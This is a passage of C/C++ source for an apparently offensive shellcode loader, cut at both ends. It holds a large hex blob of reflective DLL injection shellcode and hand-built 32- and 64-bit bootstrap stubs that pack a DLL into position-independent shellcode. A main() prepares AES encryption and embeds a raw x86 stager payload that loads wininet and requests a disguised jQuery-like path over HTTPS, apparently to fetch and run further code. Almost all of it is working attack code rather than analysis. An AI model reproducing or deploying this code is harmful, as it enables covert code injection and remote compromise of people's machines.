5\x70\x01\x00\x00\x48\x89\x44\x24\x20\xFF\x95\x10\x01\x00\x00\x85\xC0\x0F\x88\x61\x08\x00\x00\x8D\x46\x10\x39\x44\x24\x68\x0F\x87\x54\x08\x00\x00\x8B\x5C\x24\x68\xFF\x55\x88\x44\x8B\xC3\x33\xD2\x48\x8B\xC8\xFF\x95\xF8\x00\x00\x00\x33\xDB\x48\x89\x85\xC8\x00\x00\x00\x48\x8B\xF8\x48\x85\xC0\x0F\x84\x27\x08\x00\x00\x48\x8B\xD0\x48\x8D\x8D\x30\x02\x00\x00\xE8\xBF\x09\x00\x00\x48\x8B\x8D\xE0\x00\x00\x00\x44\x8D\x4E\x20\x4C\x8D\x85\xC8\x01\x00\x00\x89\x5C\x24\x20\x48\x8D\x95\xA8\x01\x00\x00\xFF\x95\xF8\x01\x00\x00\x85\xC0\x0F\x88\xF0\x07\x00\x00\x44\x8B\x8D\xD8\x00\x00\x00\x48\x8D\x85\x60\x02\x00\x00\x48\x8B\x8D\xE0\x00\x00\x00\x48\x8D\x95\x20\x01\x00\x00\x89\x5C\x24\x30\x4D\x8B\xC6\xC7\x44\x24\x28\x10\x00\x00\x00\x48\x89\x44\x24\x20\xFF\x95\x08\x02\x00\x00\x85\xC0\x0F\x88\xB2\x07\x00\x00\x44\x8B\xB5\x00\x03\x00\x00\x8D\x46\x01\x48\x8B\x8D\x20\x01\x00\x00\x49\x8D\x57\x20\x89\x44\x24\x48\x41\x83\xC6\xE0\x48\x8D\x44\x24\x70\x45\x33\xC9\x48\x89\x44\x24\x40\x45\x8B\xC6\x8B\x44\x24\x68\x89\x5C\x24\x38\x48\x89\x5C\x24\x30\x89\x44\x24\x28\x48\x89\x7C\x24\x20\xFF\x95\x08\x01\x00\x00\x85\xC0\x0F\x88\x61\x07\x00\x00\x8B\x5C\x24\x70\xFF\x55\x88\x44\x8B\xC3\x33\xD2\x48\x8B\xC8\xFF\x95\xF8\x00\x00\x00\x33\xDB\x48\x89\x85\x30\x02\x00\x00\x48\x8B\xF0\x48\x85\xC0\x0F\x84\x37\x07\x00\x00\x8B\x4C\x24\x70\x48\x8D\x44\x24\x70\xC7\x44\x24\x48\x01\x00\x00\x00\x49\x8D\x57\x20\x48\x89\x44\x24\x40\x45\x33\xC9\x89\x4C\x24\x38\x45\x8B\xC6\x8B\x4C\x24\x68\x48\x89\x74\x24\x30\x89\x4C\x24\x28\x48\x8B\x8D\x20\x01\x00\x00\x48\x89\x7C\x24\x20\xFF\x95\x08\x01\x00\x00\x85\xC0\x0F\x88\xEC\x06\x00\x00\x48\x63\x7E\x3C\x48\x03\xFE\x81\x3F\x50\x45\x00\x00\x0F\x85\x51\x07\x00\x00\xB8\x64\x86\x00\x00\x66\x39\x47\x04\x0F\x85\x42\x07\x00\x00\x44\x8B\x47\x38\x44\x8D\x7B\x01\x45\x84\xC7\x0F\x85\x31\x07\x00\x00\x0F\xB7\x4F\x14\x45\x33\xED\x48\x83\xC1\x24\x66\x44\x3B\x6F\x06\x73\x29\x44\x0F\xB7\x4F\x06\x48\x03\xCF\x8B\x41\x04\x8B\x11\x85\xC0\x75\x06\x42\x8D\x04\x02\xEB\x02\x03\xC2\x3B\xC3\x0F\x46\xC3\x48\x83\xC1\x28\x8B\xD8\x4D\x2B\xCF\x75\xDF\x48\x8D\x8D\x70\x02\x00\x00\xFF\x95\xF0\x01\x00\x00\x8B\x95\x74\x02\x00\x00\x44\x8B\xC2\x44\x8D\x72\xFF\xF7\xDA\x44\x03\x77\x50\x49\x8D\x48\xFF\x8B\xC2\x4C\x23\xF0\x8B\xC3\x48\x03\xC8\x49\x8D\x40\xFF\x48\xF7\xD0\x48\x23\xC8\x4C\x3B\xF1\x0F\x85\xB5\x06\x00\x00\x48\x8B\x4F\x30\x41\xB9\x04\x00\x00\x00\x41\xB8\x00\x30\x00\x00\x49\x8B\xD6\xFF\x95\x28\x01\x00\x00\x48\x8B\xD8\x48\x85\xC0\x75\x18\x44\x8D\x48\x04\x41\xB8\x00\x30\x00\x00\x49\x8B\xD6\x33\xC9\xFF\x95\x28\x01\x00\x00\x48\x8B\xD8\x8B\x46\x3C\x89\x43\x3C\x8B\x56\x3C\x3B\x57\x54\x73\x13\x8B\xCA\x41\x03\xD7\x8A\x04\x0E\x88\x04\x0B\x3B\x57\x54\x72\xF0\x8B\x43\x3C\x48\x63\xF8\x45\x8B\xD5\x48\x03\xFB\x48\x89\xBD\x28\x02\x00\x00\x44\x0F\xB7\x47\x14\x49\x83\xC0\x28\x66\x44\x3B\x6F\x06\x73\x3A\x4C\x03\xC7\x45\x8B\xCD\x45\x39\x28\x76\x1F\x41\x8B\x40\x04\x41\x8B\x48\xFC\x48\x03\xC6\x41\x8B\xD1\x48\x03\xCB\x45\x03\xCF\x8A\x04\x10\x88\x04\x11\x45\x3B\x08\x72\xE1\x0F\xB7\x47\x06\x45\x03\xD7\x49\x83\xC0\x28\x44\x3B\xD0\x72\xC9\x4C\x8B\xF3\x41\xB8\x02\x00\x00\x00\x4C\x2B\x77\x30\x0F\x84\xCC\x00\x00\x00\x44\x39\xAF\xB4\x00\x00\x00\x0F\x84\xBF\x00\x00\x00\x44\x8B\x8F\xB0\x00\x00\x00\x4C\x03\xCB\x45\x39\x29\x0F\x84\xAC\x00\x00\x00\x4D\x8D\x51\x08\xE9\x87\x00\x00\x00\x45\x0F\xB7\x1A\x41\x0F\xB7\xCB\x41\x0F\xB7\xC3\x66\xC1\xE9\x0C\x66\x83\xF9\x0A\x75\x25\x45\x8B\x01\x41\x81\xE3\xFF\x0F\x00\x00\x49\x8D\x04\x1B\x4A\x8B\x14\x00\x49\x8D\x04\x1B\x49\x03\xD6\x4A\x89\x14\x00\x41\xB8\x02\x00\x00\x00\xEB\x49\x66\x83\xF9\x03\x75\x0E\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x8B\xC6\xEB\x2E\x66\x41\x3B\xCF\x75\x15\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x49\x8B\xC6\x48\xC1\xE8\x10\x0F\xB7\xC0\xEB\x13\x66\x41\x3B\xC8\x75\x14\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x0F\xB7\xC6\x41\x8B\x11\x48\x01\x04\x0A\x4D\x03\xD0\x41\x8B\x41\x04\x49\x03\xC1\x4C\x3B\xD0\x0F\x85\x69\xFF\xFF\xFF\x4D\x8B\xCA\x45\x39\x2A\x0F\x85\x54\xFF\xFF\xFF\x44\x8B\xDE\x44\x39\xAF\x94\x00\x00\x00\x0F\x84\xBA\x01\x00\x00\x8B\x8F\x90\x00\x00\x00\x41\x8B\xC5\x89\x85\xD4\x00\x00\x00\x4C\x8D\x04\x19\x49\x8D\x50\x0C\x44\x39\x2A\x74\x12\x41\x03\xC7\x48\x8D\x52\x14\x44\x39\x2A\x75\xF4\x89\x85\xD4\x00\x00\x00\x41\x3B\xC7\x0F\x86\x8E\x00\x00\x00\x44\x8D\x70\xFF\x44\x89\xAD\xD0\x00\x00\x00\x45\x8B\xD5\x45\x85\xF6\x0F\x84\x83\x00\x00\x00\x4D\x8B\xC8\x41\x0F\x10\x01\x8B\xC8\x33\xD2\x41\x2B\xCA\x45\x69\xDB\xFD\x43\x03\x00\xB8\xFF\x7F\x00\x00\xF7\xF1\x33\xD2\x41\x81\xC3\xC3\x9E\x26\x00\x41\x8D\x0C\x07\x41\x8B\xC3\xC1\xE8\x10\x25\xFF\x7F\x00\x00\xF7\xF1\x41\x03\xC2\x45\x03\xD7\x48\x8D\x0C\x80\x41\x8B\x54\x88\x10\x41\x0F\x10\x0C\x88\x41\x0F\x11\x04\x88\x41\x8B\x41\x10\x41\x89\x44\x88\x10\x8B\x85\xD4\x00\x00\x00\x41\x0F\x11\x09\x41\x89\x51\x10\x4D\x8D\x49\x14\x45\x3B\xD6\x72\x94\x8B\x8F\x90\x00\x00\x00\xEB\x0C\x8B\x85\xD0\x00\x00\x00\x89\x85\xD0\x00\x00\x00\x44\x8B\xF1\x4C\x03\xF3\x41\x8B\x46\x0C\x85\xC0\x0F\x84\xD7\x00\x00\x00\x8B\xBD\xD4\x00\x00\x00\x8B\xB5\xD0\x00\x00\x00\x8B\xC8\x48\x03\xCB\xFF\x95\x20\x02\x00\x00\x48\x89\x44\x24\x60\x45\x33\xC0\x45\x8B\x3E\x4C\x8B\xD0\x45\x8B\x6E\x10\x4C\x03\xFB\x4C\x03\xEB\x49\x8B\x0F\x48\x85\xC9\x74\x6A\x48\x85\xC9\x79\x08\x45\x0F\xB7\x07\x33\xD2\xEB\x3A\x48\x8D\x53\x02\x49\x8B\xC0\x48\x03\xD1\x44\x38\x02\x74\x14\x48\x8B\xCA\x41\xB9\x01\x00\x00\x00\x49\x03\xC9\x49\x03\xC1\x44\x38\x01\x75\xF5\x48\x89\x54\x24\x58\x45\x33\xC0\x48\x8D\x54\x24\x50\x66\x89\x44\x24\x50\x66\x89\x44\x24\x52\x4D\x8B\xCD\x49\x8B\xCA\x41\xFF\xD4\x49\x83\xC7\x08\x49\x83\xC5\x08\x45\x33\xC0\x49\x8B\x0F\x48\x85\xC9\x74\x07\x4C\x8B\x54\x24\x60\xEB\x96\xB8\x01\x00\x00\x00\x3B\xF8\x76\x0C\x69\xCE\xE8\x03\x00\x00\xFF\x95\xE8\x01\x00\x00\x41\x8B\x46\x20\x49\x83\xC6\x14\x45\x33\xED\x85\xC0\x0F\x85\x43\xFF\xFF\xFF\x48\x8B\xBD\x28\x02\x00\x00\x48\x8B\xB5\x30\x02\x00\x00\x44\x39\xAF\xF4\x00\x00\x00\x0F\x84\xC8\x00\x00\x00\x44\x8B\xAF\xF0\x00\x00\x00\x49\x83\xC5\x04\x4C\x03\xEB\x41\x8B\x45\x00\x85\xC0\x0F\x84\xAB\x00\x00\x00\xBF\x20\x00\x00\x00\x8B\xC8\x48\x03\xCB\xFF\x95\x20\x02\x00\x00\x48\x89\x44\x24\x60\x45\x33\xC9\x45\x8B\x75\x08\x48\x8B\xC8\x45\x8B\x7D\x0C\x4C\x03\xF3\x4C\x03\xFB\x4D\x39\x0E\x74\x67\x49\x8B\x17\x48\x85\xD2\x79\x08\x44\x0F\xB7\xC2\x33\xD2\xEB\x3A\x4C\x8D\x43\x02\x49\x8B\xC1\x4C\x03\xC2\x45\x38\x08\x74\x14\x49\x8B\xD0\x41\xBA\x01\x00\x00\x00\x49\x03\xD2\x49\x03\xC2\x44\x38\x0A\x75\xF5\x4C\x89\x44\x24\x58\x48\x8D\x54\x24\x50\x45\x33\xC0\x66\x89\x44\x24\x50\x66\x89\x44\x24\x52\x4D\x8B\xCE\x41\xFF\xD4\x49\x83\xC6\x08\x49\x83\xC7\x08\x45\x33\xC9\x4D\x39\x0E\x74\x07\x48\x8B\x4C\x24\x60\xEB\x99\x4C\x03\xEF\x41\x8B\x45\x00\x85\xC0\x0F\x85\x61\xFF\xFF\xFF\x48\x8B\xBD\x28\x02\x00\x00\x45\x33\xED\x44\x0F\xB7\x77\x14\x45\x8B\xFD\x49\x83\xC6\x28\x41\xBC\x01\x00\x00\x00\x66\x44\x3B\x6F\x06\x0F\x83\xA7\x00\x00\x00\x4C\x03\xF7\x41\x8D\x74\x24\x01\x45\x39\x2E\x74\x7F\x41\x8B\x46\x14\x8B\xC8\x81\xE1\x00\x00\x00\x40\x0F\xBA\xE0\x1D\x72\x1E\x85\xC9\x75\x0C\x85\xC0\x44\x8D\x41\x08\x45\x0F\x49\xC4\xEB\x2F\x85\xC0\x41\xB8\x04\x00\x00\x00\x44\x0F\x49\xC6\xEB\x21\x85\xC9\x75\x0D\x85\xC0\x41\xB8\x80\x00\x00\x00\x8D\x41\x10\xEB\x0C\x41\xB8\x40\x00\x00\x00\x85\xC0\x41\x8D\x40\xE0\x44\x0F\x49\xC0\x44\x89\x44\x24\x6C\x41\xF7\x46\x14\x00\x00\x00\x04\x74\x0A\x41\x0F\xBA\xE8\x09\x44\x89\x44\x24\x6C\x41\x8B\x4E\xFC\x4C\x8D\x4C\x24\x6C\x41\x8B\x16\x48\x03\xCB\xFF\x95\x18\x02\x00\x00\x0F\xB7\x47\x06\x45\x03\xFC\x49\x83\xC6\x28\x44\x3B\xF8\x0F\x82\x68\xFF\xFF\xFF\x48\x8B\xB5\x30\x02\x00\x00\x45\x33\xC0\x33\xD2\x48\x83\xC9\xFF\xFF\x95\x10\x02\x00\x00\x44\x39\xAF\xD4\x00\x00\x00\x74\x24\x8B\x87\xD0\x00\x00\x00\x4C\x8B\x74\x18\x18\xEB\x0F\x45\x33\xC0\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x4D\x8D\x76\x08\x49\x8B\x06\x48\x85\xC0\x75\xE9\x4C\x8B\x8D\x40\x02\x00\x00\x4D\x85\xC9\x74\x2F\x8B\x87\xA4\x00\x00\x00\x85\xC0\x74\x25\x8B\xC8\x4C\x8B\xC3\x48\xB8\xAB\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x48\xF7\xE1\x8B\x8F\xA0\x00\x00\x00\x48\xC1\xEA\x03\x48\x03\xCB\x41\x2B\xD4\x41\xFF\xD1\x8B\x47\x28\x4D\x8B\xC4\x48\x03\xC3\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x44\x8B\xB5\xE8\x02\x00\x00\x45\x85\xF6\x0F\x84\x9C\x00\x00\x00\x44\x39\xAF\x8C\x00\x00\x00\x0F\x84\x8F\x00\x00\x00\x8B\x8F\x88\x00\x00\x00\x48\x03\xCB\x44\x8B\x59\x18\x45\x85\xDB\x74\x7D\x44\x39\x69\x14\x74\x77\x44\x8B\x49\x20\x41\x8B\xFD\x8B\x51\x24\x4C\x03\xCB\x48\x03\xD3\x45\x85\xDB\x74\x62\x45\x8B\x01\x45\x8B\xD5\x4C\x03\xC3\x74\x57\x41\x8A\x00\x84\xC0\x74\x1E\x4D\x03\xC4\x0F\xBE\xC0\x44\x03\xD0\x41\xC1\xCA\x0D\x41\x8A\x00\x84\xC0\x75\xEC\x45\x3B\xF2\x75\x05\x48\x85\xD2\x75\x12\x41\x03\xFC\x49\x83\xC1\x04\x48\x83\xC2\x02\x41\x3B\xFB\x73\x22\xEB\xBE\x8B\x41\x1C\x0F\xB7\x0A\x48\x03\xC3\x8B\x95\xF8\x02\x00\x00\x44\x8B\x04\x88\x48\x8B\x8D\xF0\x02\x00\x00\x4C\x03\xC3\x41\xFF\xD0\x48\x8B\xBD\xC8\x00\x00\x00\x4C\x8B\xAD\x50\x02\x00\x00\xEB\x0A\x48\x8B\xF8\x48\x8B\x9D\x50\x02\x00\x00\x48\x8B\x8D\xE0\x00\x00\x00\x48\x85\xC9\x74\x08\x33\xD2\xFF\x95\x00\x02\x00\x00\x48\x8B\x8D\x20\x01\x00\x00\x48\x85\xC9\x74\x03\x41\xFF\xD5\x48\x85\xFF\x74\x11\xFF\x55\x88\x4C\x8B\xC7\x33\xD2\x48\x8B\xC8\xFF\x95\xF0\x00\x00\x00\x48\x8B\xBD\x48\x02\x00\x00\x48\x85\xFF\x74\x11\xFF\x55\x88\x4C\x8B\xC7\x33\xD2\x48\x8B\xC8\xFF\x95\xF0\x00\x00\x00\x48\x85\xF6\x74\x11\xFF\x55\x88\x4C\x8B\xC6\x33\xD2\x48\x8B\xC8\xFF\x95\xF0\x00\x00\x00\x48\x8B\xC3\xEB\x02\x33\xC0\x48\x8B\x9C\x24\xE0\x03\x00\x00\x48\x81\xC4\xA0\x03\x00\x00\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5F\x5E\x5D\xC3\xCC\xCC\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3\x45\x33\xC0\x48\x8D\x41\x0F\x4C\x8D\x4A\x0F\x48\x3B\xD0\x77\x1A\x4C\x3B\xC9\x72\x15\x48\x2B\xCA\x8A\x04\x11\x41\xFF\xC0\x88\x02\x48\xFF\xC2\x41\x83\xF8\x10\x72\xEF\xC3\x0F\x10\x01\xF3\x0F\x7F\x02\x41\xFF\xC0\x41\x83\xF8\x10\x72\xF7\xC3");
    DWORD rdiShellcode32Length = 6163, rdiShellcode64Length = 5011;
    //MARKER:E
#endif

	if (Is64BitDll((UINT_PTR)plainInBytes))
	{

		rdiShellcode = rdiShellcode64;
		rdiShellcodeLength = rdiShellcode64Length;

		if (rdiShellcode == nullptr || rdiShellcodeLength == 0) return 0;

		BYTE bootstrap[64] = { 0 };
		DWORD i = 0;

		// call next instruction (Pushes next instruction address to stack)
		bootstrap[i++] = 0xe8;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;

		// Set the offset to our DLL from pop result
		dllOffset = sizeof(bootstrap) - i + rdiShellcodeLength;

		// pop rcx - Capture our current location in memory
		bootstrap[i++] = 0x59;

		// mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
		bootstrap[i++] = 0x49;
		bootstrap[i++] = 0x89;
		bootstrap[i++] = 0xc8;

		// add rcx, <Offset of the DLL>
		bootstrap[i++] = 0x48;
		bootstrap[i++] = 0x81;
		bootstrap[i++] = 0xc1;
		MoveMemory(bootstrap + i, &dllOffset, sizeof(dllOffset));
		i += sizeof(dllOffset);

		// mov edx, <hash of function>
		bootstrap[i++] = 0xba;
		MoveMemory(bootstrap + i, &userFunction, sizeof(userFunction));
		i += sizeof(userFunction);

		// Setup the location of our user data
		// add r8, <Offset of the DLL> + <Length of DLL>
		bootstrap[i++] = 0x49;
		bootstrap[i++] = 0x81;
		bootstrap[i++] = 0xc0;
		userDataLocation = dllOffset + length;
		MoveMemory(bootstrap + i, &userDataLocation, sizeof(userDataLocation));
		i += sizeof(userDataLocation);

		// mov r9d, <Length of User Data>
		bootstrap[i++] = 0x41;
		bootstrap[i++] = 0xb9;
		MoveMemory(bootstrap + i, &userLength, sizeof(userLength));
		i += sizeof(userLength);

		// push rsi - save original value
		bootstrap[i++] = 0x56;

		// mov rsi, rsp - store our current stack pointer for later
		bootstrap[i++] = 0x48;
		bootstrap[i++] = 0x89;
		bootstrap[i++] = 0xe6;

		// and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
		bootstrap[i++] = 0x48;
		bootstrap[i++] = 0x83;
		bootstrap[i++] = 0xe4;
		bootstrap[i++] = 0xf0;

		// sub rsp, 0x30 - Create some breathing room on the stack 
		bootstrap[i++] = 0x48;
		bootstrap[i++] = 0x83;
		bootstrap[i++] = 0xec;
		bootstrap[i++] = 6 * 8; // 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment

		// mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
		bootstrap[i++] = 0xC7;
		bootstrap[i++] = 0x44;
		bootstrap[i++] = 0x24;
		bootstrap[i++] = 4 * 8;
		MoveMemory(bootstrap + i, &length, sizeof(length));
		i += sizeof(length);

		// call - Transfer execution to the RDI
		bootstrap[i++] = 0xe8;
		bootstrap[i++] = sizeof(bootstrap) - i - 4; // Skip over the remainder of instructions
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;

		// mov rsp, rsi - Reset our original stack pointer
		bootstrap[i++] = 0x48;
		bootstrap[i++] = 0x89;
		bootstrap[i++] = 0xf4;

		// pop rsi - Put things back where we left them
		bootstrap[i++] = 0x5e;

		// ret - return to caller
		bootstrap[i++] = 0xc3;

		// Ends up looking like this in memory:
		// Bootstrap shellcode
		// RDI shellcode 
		// DLL bytes
		// User data
		outLength = length + userLength + rdiShellcodeLength + sizeof(bootstrap);
		outBytes = (LPSTR)malloc(outLength);
		MoveMemory(outBytes, bootstrap, sizeof(bootstrap));
		MoveMemory(outBytes + sizeof(bootstrap), rdiShellcode, rdiShellcodeLength);
		MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength, inBytes, length);
		MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength + length, userData, userLength);

	}
	else { // 32 bit

		rdiShellcode = rdiShellcode32;
		rdiShellcodeLength = rdiShellcode32Length;

		if (rdiShellcode == nullptr || rdiShellcodeLength == 0) return 0;

		BYTE bootstrap[49] = { 0 };
		DWORD i = 0;

		// call next instruction (Pushes next instruction address to stack)
		bootstrap[i++] = 0xe8;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;

		// Set the offset to our DLL from pop result
		dllOffset = sizeof(bootstrap) - i + rdiShellcodeLength;

		// pop eax - Capture our current location in memory
		bootstrap[i++] = 0x58;

		// push ebp
		bootstrap[i++] = 0x55;

		// move ebp, esp
		bootstrap[i++] = 0x89;
		bootstrap[i++] = 0xe5;

		// mov edx, eax - copy our location in memory to ebx before we start modifying eax
		bootstrap[i++] = 0x89;
		bootstrap[i++] = 0xc2;

		// add eax, <Offset to the DLL>
		bootstrap[i++] = 0x05;
		MoveMemory(bootstrap + i, &dllOffset, sizeof(dllOffset));
		i += sizeof(dllOffset);

		// add edx, <Offset to the DLL> + <Size of DLL>
		bootstrap[i++] = 0x81;
		bootstrap[i++] = 0xc2;
		userDataLocation = dllOffset + length;
		MoveMemory(bootstrap + i, &userDataLocation, sizeof(userDataLocation));
		i += sizeof(userDataLocation);

		// push <Flags>
		bootstrap[i++] = 0x68;
		MoveMemory(bootstrap + i, &length, sizeof(length));
		i += sizeof(length);

		// push <Length of User Data>
		bootstrap[i++] = 0x68;
		MoveMemory(bootstrap + i, &userLength, sizeof(userLength));
		i += sizeof(userLength);

		// push edx
		bootstrap[i++] = 0x52;

		// push <hash of function>
		bootstrap[i++] = 0x68;
		MoveMemory(bootstrap + i, &userFunction, sizeof(userFunction));
		i += sizeof(userFunction);

		// push eax
		bootstrap[i++] = 0x50;

		// call - Transfer execution to the RDI
		bootstrap[i++] = 0xe8;
		bootstrap[i++] = sizeof(bootstrap) - i - 4; // Skip the remainder of instructions
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;
		bootstrap[i++] = 0x00;

		// add esp, 0x14 - clean up stack from args (cdecl)
		bootstrap[i++] = 0x83;
		bootstrap[i++] = 0xc4;
		bootstrap[i++] = 0x14;

		// leave
		bootstrap[i++] = 0xc9;

		// ret - return to caller
		bootstrap[i++] = 0xc3;

		// Ends up looking like this in memory:
		// Bootstrap shellcode
		// RDI shellcode
		// DLL bytes
		// User data
		outLength = length + userLength + rdiShellcodeLength + sizeof(bootstrap);
		outBytes = (LPSTR)malloc(outLength);
		MoveMemory(outBytes, bootstrap, sizeof(bootstrap));
		MoveMemory(outBytes + sizeof(bootstrap), rdiShellcode, rdiShellcodeLength);
		MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength, inBytes, length);
		MoveMemory(outBytes + sizeof(bootstrap) + rdiShellcodeLength + length, userData, userLength);
	}

	return true;
}

ULONGLONG extraNoise = 1337;

VOID GenerateRandomBytes(PBYTE in, SIZE_T inSize)
{
	srand(GetTickCount64() + extraNoise);
	
	for (SIZE_T i = 0; i < inSize; i++)
	{
		in[i] = (BYTE)rand();
	}

	extraNoise += 1337;
}

VOID HexDump(const PVOID data, SIZE_T size) {
	char ascii[17];
	SIZE_T i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		wprintf(L"%02X ", ((PBYTE)data)[i]);
		if (((PBYTE)data)[i] >= ' ' && ((PBYTE)data)[i] <= '~') {
			ascii[i % 16] = ((PBYTE)data)[i];
		}
		else {
			ascii[i % 16] = '.';
		}
		if ((i + 1) % 8 == 0 || i + 1 == size) {
			wprintf(L" ");
			if ((i + 1) % 16 == 0) {
				wprintf(L"|  %hs \n", ascii);
			}
			else if (i + 1 == size) {
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8) {
					wprintf(L" ");
				}
				for (j = (i + 1) % 16; j < 16; ++j) {
					wprintf(L"   ");
				}
				wprintf(L"|  %hs \n", ascii);
			}
		}
	}
	wprintf(L"\n");
}

typedef UINT_PTR (WINAPI* RDI)();
typedef void	 (WINAPI* Function)();
typedef BOOL	 (__cdecl* EXPORTEDFUNCTION)(LPVOID, DWORD);

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

NTSTATUS main(int argc, char* argv[])
{
	LPSTR					finalShellcode = nullptr;
	DWORD					dwOldProtect1 = 0;
	SYSTEM_INFO				sysInfo;
	BCRYPT_ALG_HANDLE       hAesAlg = nullptr;
	BCRYPT_KEY_HANDLE       hKey = nullptr;
	NTSTATUS                status = STATUS_UNSUCCESSFUL;
	DWORD                   cbCipherPayload = 0,
							cbRawPayload = 0,
							cbRawDll = 0,
							cbCipherDll = 0,
							cbData = 0,
							cbKeyObject = 0,
							cbBlockLen = 0,
							finalSize;
	PBYTE					pbCipherDll = nullptr,
							pbRawDll = nullptr,
							pbCipherPayload = nullptr,
							pbRawPayload = nullptr,
							pbKeyObject = nullptr,
							pbIV = nullptr,
							rgbRawDll = nullptr;
	BYTE                    creds[32] = {},
							dllCreds[32] = {},
							rgbDllIV[16] = {},
							rgbDllAES128Key[16] = {},
							rgbIV[16] = {},
							rgbAES128Key[16] = {};
	std::fstream			outFile,
							dllFile,
							payloadFile;
	HMODULE					hmRawDll;
	HRSRC					hrRawDll;
	HGLOBAL					hgRawDll;
	LPVOID					lpRawDll;

	BYTE					rgbRawPayload[835] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\xe8\x00\x00\x00\x00\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\xa4\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\x50\xe9\x8c\x00\x00\x00\x5b\x31\xd2\x52\x68\x00\x32\xc0\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x5f\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xca\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x75\x07\x58\x50\xe9\x7b\xff\xff\xff\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x6f\xff\xff\xff\x2f\x6a\x71\x75\x65\x72\x79\x2d\x33\x2e\x33\x2e\x31\x2e\x73\x6c\x69\x6d\x2e\x6d\x69\x